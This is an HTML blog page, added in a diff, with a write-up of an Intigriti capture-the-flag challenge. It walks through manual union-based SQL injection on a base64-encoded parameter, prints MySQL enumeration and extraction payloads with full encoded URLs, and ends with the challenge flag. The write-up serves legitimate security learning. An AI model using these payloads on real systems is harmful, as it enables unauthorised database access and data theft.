@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Intigriti | Challenge 0926 Writeup | Yours, Sto ʚɞ</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap">
+
+      <script src="/js/main.js"></script>
+
+
+<meta name="description" content="A simple yet, the kind of SQL injection a bug hunter yearns to unveil ^.^">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti | Challenge 0926 Writeup">
+<meta property="og:description" content="A simple yet, the kind of SQL injection a bug hunter yearns to unveil ^.^">
+<meta property="og:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Intigriti | Challenge 0926 Writeup">
+<meta name="twitter:description" content="A simple yet, the kind of SQL injection a bug hunter yearns to unveil ^.^">
+<meta name="twitter:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="google-site-verification" content="HZuVMLvcO_JxYvwt6swb5-dfFikUHJW1aVEEvBvEDtI" />
+</head>
+<body>
+  <header>
+    <a href="/"><h3>Yours, Sto ʚɞ</h3></a>
+
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    <li>
+      <a href="/tags/">Tags</a>
+    </li>
+    <li>
+      <a href="/whoami/">Whoami</a>
+    </li>
+    </ul>
+  </nav>
+
+</div>
+
+  </header>
+  <main>
+    
+  <h1>Intigriti | Challenge 0926 Writeup</h1>
+
+    
+      <p class="date">Sep 23, 2026</p>
+    
+
+
+    
+    
+  <div class="tags">
+    
+    <ul>
+        <li><a href="/tags/sqli/">#SQLI</a></li>
+    </ul>
+  </div>
+
+    
+    <div class="content">
+      <p>Intigriti&rsquo;s September challenge was a challenge I had fun solving, leveraging a simple, yet, the kind of SQL Injection (SQLI) that a bug hunter looks forward to unveil in real scenarios. This writeup encompasses a step-by-step approach to perform SQLI manually going from recon to capturing the flag.</p>
+<p>We note that SQLI occur when an attacker is able to manipulate the SQL queries made to an SQL database by injecting malicious input, allowing them to execute arbitrary SQL queries on the server&rsquo;s database (DB).</p>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<p>We land on the PHP <a href="https://challenge-0926.challenges.intigriti.io/challenge.php">challenge page</a> which encompasses a critter gallery.</p>
+<p>We observe that each critter pic holds a link with the parameter <code>pic</code> and the base64 encoded name of the animal. For instance, <code>?pic=a29hbGE=</code> loads the <code>koala</code> card as showcased below.
+<img src="image-6.png" alt="test"></p>
+<p>As a first reflex, we set the parameter <code>pic</code> to <code>'</code> base64 encoded, by visiting <code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Jw==</code>, which yields a white blank page.</p>
+<p>Furthermore, when visiting <code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBvciAxOyM=</code>, in other words, setting the parameter <code>pic</code> to <code>' or 1;#</code> base64-encoded, we obtain the description of the fox, so the <em>first</em> critter as underlined below.
+<img src="image.png" alt="thumbnail"></p>
+<p>Thus, we have SQL Injection in the parameter <code>pic</code> which we can exploit by injecting our query base64 encoded ^^</p>
+<p>Our flag is probably in the app&rsquo;s database, hence let&rsquo;s try to retrieve the latter&rsquo;s content.</p>
+<h3 id="learning-more-about-our-db">Learning more about our DB</h3>
+<ol>
+<li>We first identify the DBMS.
+Our first intuition is MySQL. Let&rsquo;s try to verify that by injecting the payload</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select @@version_comment; #
+</span></span></span></code></pre></div><p>by visiting <code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyB1bmlvbiBzZWxlY3QgQEB2ZXJzaW9uX2NvbW1lbnQ7ICM=</code>.
+<img src="image-7.png" alt="alt text">
+Indeed, our intuition was right, the DBMS is MySQL.</p>
+<ol start="2">
+<li>Now, let&rsquo;s try to retrieve the names of all schemas on the server using the query</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata; #
+</span></span></span></code></pre></div><p>To achieve that, we set the URL to
+<code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKDB4N2Msc2NoZW1hX25hbWUsMHg3YykgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGE7ICM=</code>
+<img src="image-1.png" alt="alt text"></p>
+<ol start="3">
+<li>We then extract the names of all tables within the schema <code>critter_gallery</code> by setting the query to</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=&#34;critter_gallery&#34;; #
+</span></span></span></code></pre></div><p>By visiting <code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKDB4N2MsdGFibGVfbmFtZSwweDdDKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPSJjcml0dGVyX2dhbGxlcnkiOyAj</code>, we obtain the tables <code>animals</code>, and most importantly <code>secret_vault</code>.
+<img src="image-3.png" alt="alt text"></p>
+<ol start="4">
+<li>Let&rsquo;s retrieve the latter&rsquo;s columns using the query below base64-encoded</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=&#34;secret_vault&#34;; #
+</span></span></span></code></pre></div><p><code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKDB4N2MsY29sdW1uX25hbWUsMHg3QykgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSJzZWNyZXRfdmF1bHQiOyAj</code> gives the columns <code>id</code> and <code>note</code>.
+<img src="image-8.png" alt="alt text"></p>
+<p>Our flag is probably in the column <code>note</code> so let&rsquo;s retrieve its content.</p>
+<h3 id="poc">PoC</h3>
+<p>We set the parameter <code>pic</code> to the query :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(0x7c,note,0x7C) FROM secret_vault; #
+</span></span></span></code></pre></div><p>base64-encoded and visit the URL <code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKDB4N2Msbm90ZSwweDdDKSBGUk9NIHNlY3JldF92YXVsdDsgIw==</code>.
+This yields our flag as underlined below :</p>
+<p><img src="image-5.png" alt="alt text"></p>
+<p>And voila, as highlighted, our flag is <strong>INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</strong>.</p>
+
+    </div>
+    
+
+  </div>
+
+
+  </main>
+  <footer>
+    
+<p>© 2026 Sto ʚɞ. All rights reserved.</p>
+  </footer>
+</body>
+</html>
